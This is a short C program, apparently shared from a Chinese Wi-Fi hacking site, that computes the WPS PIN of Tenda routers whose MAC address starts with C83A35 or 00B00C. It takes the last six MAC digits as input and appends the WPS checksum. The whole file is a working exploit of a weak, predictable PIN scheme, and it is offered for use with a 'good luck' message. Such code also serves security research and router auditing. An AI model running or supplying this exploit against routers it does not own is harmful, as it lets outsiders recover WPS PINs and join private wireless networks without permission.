//Computes PIN code starts with OUI "C83A35" and "00B00C"

//Both two OUIs which belonged to Tenda Technology Co., Ltd are confirmed effectively.
//Coded by Zhaochunsheng - iBeini.com
//Modified by Lingxi - WiFiBETA.COM
 
 
#include <stdio.h>
#include <stdlib.h>
//#include <stdafx.h>
 
int main()
{
 
    unsigned int wps_pin_checksum(unsigned int pin);
    int PIN = 0;
 
 //   printf("ComputePIN-C83A35\n");
    printf("Description:\n");
    printf("If your wireless router MAC address start with \"C83A35\" or \"00B00C\",\n");
    printf("type the other six digits, you might be able to get the \n");
    printf("WPS-PIN of this equipment, please have a try, good luck!\n\n");
    printf("Code by ZhaoChunsheng 04/07/2012 http://iBeini.com\n\n");
    printf("Modified by Lingxi - WiFiBETA.COM\n\n");
//Translated to Chinese
 printf("说明：\n");
 printf("如果您的无线路由器MAC地址以“C83A35”或“00B00C”打头，\n");
 printf("输入后六位MAC地址（不分大小写）您或许可以获得该路由的WPS PIN密钥！\n");
 printf("祝你好运！\n\n");
 printf("由赵春生编写于2012年4月7日  Http://iBeini.com\n");
 printf("由灵曦修改并汉化  WiFiBETA.COM\n\n");
    printf("请输入后六位MAC地址（HEX）：\n");
    printf("Input the last 6 digits of MAC Address(HEX):");
	scanf("%x",&PIN);
    printf("您输入的后六位MAC地址是 %X\n",PIN);
    printf("Last 6 digits of MAC Address(HEX) are: %X\n",PIN);
    printf("WPS PIN is: %07d%d\n",PIN%10000000,wps_pin_checksum(PIN%10000000));
 
    return 0;
}
 
unsigned int wps_pin_checksum(unsigned int pin)
{
unsigned int accum = 0;
while (pin)
{
accum += 3 * (pin % 10);
pin /= 10;
accum += pin % 10;
pin /= 10;
}
 
    return (10 - accum % 10) % 10;
}


